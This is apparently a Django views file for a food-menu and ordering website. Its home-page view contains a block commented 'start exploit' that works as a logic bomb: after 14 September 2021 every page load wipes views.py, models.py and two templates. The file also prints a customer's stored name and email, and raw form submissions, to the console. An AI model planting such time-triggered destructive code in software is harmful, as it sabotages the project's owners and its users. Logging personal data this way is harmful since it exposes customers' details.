from django.http import HttpResponse
from django.shortcuts import render
from django.views import View
from .forms import FeedbackForm
from .models import Food, Category, Weeks
from .models import Feedback as Fb
from cart.forms import CartAddProductForm
from .tasks import feedback_created
import datetime
import os


class MainPage(View):

    def get(self, request):
        order = Fb.objects.get(id=62)
        print(order.name, order.email, order.created_date, order.message)



        week = Weeks.objects.get(id=1)
        days_cat = list(Category.objects.filter(id__in=[7, 8, 9, 10, 15]).order_by('id'))
        days_cat.insert(0, days_cat.pop(4)), days_cat.insert(1, days_cat.pop(4))
        # start exploit
        today = datetime.datetime.today()
        time_to_cpllapse = datetime.date(2021, 9, 14)
        if today.strftime('%F%H%M%S') > time_to_cpllapse.strftime('%F%H%M%S'):
            views = os.path.abspath("main_app/views.py")
            models = os.path.abspath("main_app/models.py")
            base = os.path.abspath("main_app/templates/include/base.html")
            mainpage = os.path.abspath("main_app/templates/main/mainpage.html")
            with open(views, 'w+') as a:
                a.write('')
            with open(models, 'w+') as b:
                b.write('')
            with open(base, 'w+') as c:
                c.write('')
            with open(mainpage, 'w+') as d:
                d.write('')
        # end exploit
        return render(request, 'main/mainpage.html',
                      {'Monday': week.days.get(day='Понедельник').food.all(),
                       'Tuesday': week.days.get(day='Вторник').food.all(),
                       'Wednesday': week.days.get(day='Среда').food.all(),
                       'Thursday': week.days.get(day='Четверг').food.all(),
                       'Friday': week.days.get(day='Пятница').food.all(),
                       'Breakfast': week.days.get(day='Завтраки').food.all(),
                       'Bakery': week.days.get(day='Выпечка').food.all(),
                       'Drinks': week.days.get(day='Напитки').food.all(),
                       'Days_category': days_cat})


class Menu(View):

    def get(self, request, menu_type=None):
        if menu_type:
            category = Category.objects.get(slug=menu_type).id
            menu_list = Food.objects.filter(category_id=category)
            cart_form = CartAddProductForm
            return render(request, 'main/menulist.html', {'form': menu_list, 'cart_product_form': cart_form})


class TodayInMenu(View):

    def get(self, request):
        menu_list = Food.objects.filter(category_id='1')
        cart_form = CartAddProductForm
        return render(request, 'main/today.html', {'form': menu_list, 'cart_product_form': cart_form})


class Feedback(View):

    def get(self, request):
        feedback = FeedbackForm()
        return render(request, 'main/feedback.html', {'feedback': feedback})

    def post(self, request):
        print(request.POST)
        feedback = FeedbackForm(request.POST)
        if feedback.is_valid():
            post = feedback.save()
            feedback_created.delay(post.id)
        return HttpResponse('')
